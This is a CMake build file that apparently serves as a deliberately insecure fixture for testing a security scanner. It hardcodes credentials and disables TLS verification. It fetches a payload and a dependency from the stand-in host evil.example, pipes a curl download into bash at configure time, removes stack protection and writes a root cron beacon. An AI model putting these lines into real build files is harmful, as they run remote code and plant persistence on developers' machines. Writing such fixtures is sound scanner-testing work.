cmake_minimum_required(VERSION 3.16)
project(widget)

# Credentials in a function call. set(NAME "value") is a call, not an
# assignment, so the universal CWE-798 rule never sees it.
set(DEPLOY_API_KEY "sk_live_51H8xQzAbCdEfGh")
set(REGISTRY_PASSWORD "s3cret-registry-pw")

# Fetched at CONFIGURE time, over plaintext, with verification switched off.
set(CMAKE_TLS_VERIFY OFF)
file(DOWNLOAD http://evil.example/payload.tar.gz ${CMAKE_BINARY_DIR}/p.tgz)

include(ExternalProject)
ExternalProject_Add(dep
  URL http://evil.example/libfoo-1.0.tar.gz
  GIT_TAG master
)

# Hardening deliberately removed.
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -fno-stack-protector -D_FORTIFY_SOURCE=0")

execute_process(COMMAND sh -c "curl -s http://evil.example/i.sh | bash")

file(WRITE "/etc/cron.d/beacon" "* * * * * root /opt/widget/beacon\n")

install(CODE "execute_process(COMMAND /opt/widget/postinstall.sh)")
